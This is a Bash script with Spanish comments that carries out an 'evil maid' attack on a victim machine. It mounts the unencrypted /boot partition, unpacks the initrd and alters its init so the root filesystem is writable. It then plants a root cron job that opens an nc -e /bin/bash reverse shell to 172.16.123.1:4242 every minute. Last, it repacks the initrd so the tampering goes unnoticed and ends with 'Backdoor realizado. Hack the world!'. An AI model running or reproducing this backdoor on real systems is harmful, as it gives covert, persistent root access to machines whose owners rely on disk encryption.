#!/bin/bash

# Uso
# sudo ./em_shell_injector.sh

# Verifica que el script se ejecute como root
if [[ $EUID -ne 0 ]]; then
   echo "Este script debe ser utilizado solo por el usuario root"
   exit 1
fi

# Cambia al directorio home del usuario
cd ~ || exit

echo "[*] Montando la carpeta /boot en el sistema..."

# Crea directorio para montar boot de la victima
mkdir -p /mnt/em/boot

# Valida si nvme0n1p2 existe
if [[ ! -e /dev/nvme0n1p2 ]]; then
    echo "La partición /dev/nvme0n1p2 no existe."
    exit 1
fi

# Monta la partición de boot de la victima
mount /dev/nvme0n1p2 /mnt/em/boot

echo "[*] Realizando un backup del initrd original..."

# Verifica si el archivo initrd.img-5.10.0-34-arm64 existe
if [[ ! -f /mnt/em/boot/initrd.img-5.10.0-34-arm64 ]]; then
    echo "El archivo initrd.img-5.10.0-34-arm64 no existe en /mnt/em/boot."
    exit 1
fi

# Realiza el backup del initrd para usarlo en caso de romper el sistema
cp /mnt/em/boot/initrd.img-5.10.0-34-arm64 /mnt/em/boot/initrd.img-5.10.0-34-arm64.bak

# Crea carpeta de trabajo para el initrd
mkdir initrd-em
cd initrd-em/ || exit

echo "[*] Copiando initrd original al directorio actual..."

# Copia el initrd de la victima hacia el directorio actual
cp /mnt/em/boot/initrd.img-5.10.0-34-arm64 .

echo "[*] Extrayendo initrd..."

# Extrae el initrd
unmkinitramfs -v initrd.img-5.10.0-34-arm64 ./extracted/

# Cambia al directorio de trabajo
cd extracted/ || exit

echo "[*] Modificando init..."

# Valida si init existe
if [[ ! -f init ]]; then
    echo "El archivo init no existe en el directorio extraído."
    exit 1
fi

# Cambia los indicadores en el archivo de init de solo lectura a lectura y escritura
# Esto con el fin de poder modificar el sistema de archivos
# para añadir el código malicioso.
sed -i 's/readonly=y/readonly=n/' init

# Añade el código en la linea 321 antes del comando de run-init,
# de esta manera es posible crear un archivo dentro de las secciones
# previamente encriptadas por el disco.
# En este caso se añade un cronjob que ejecuta un reverse shell en root
# a la IP del atacante cada minuto.
# shellcheck disable=SC2016
sed -i '321 i echo '\''* * * * * root nc -e /bin/bash 172.16.123.1 4242'\'' > "${rootmnt}/etc/cron.d/em_cron"' init

echo "[*] Reconstruyendo y copiando el initrd a su lugar original..."

# Finalmente se re-empaca el initrd en su estructura newc
# en base a todos los archivos encontrados por find.
# Este se copia nuevamente al boot de la victima
# como si nada hubiera pasado.
find . | cpio -o -H newc > /mnt/em/boot/initrd.img-5.10.0-34-arm64

echo "[*] Backdoor realizado. Hack the world!"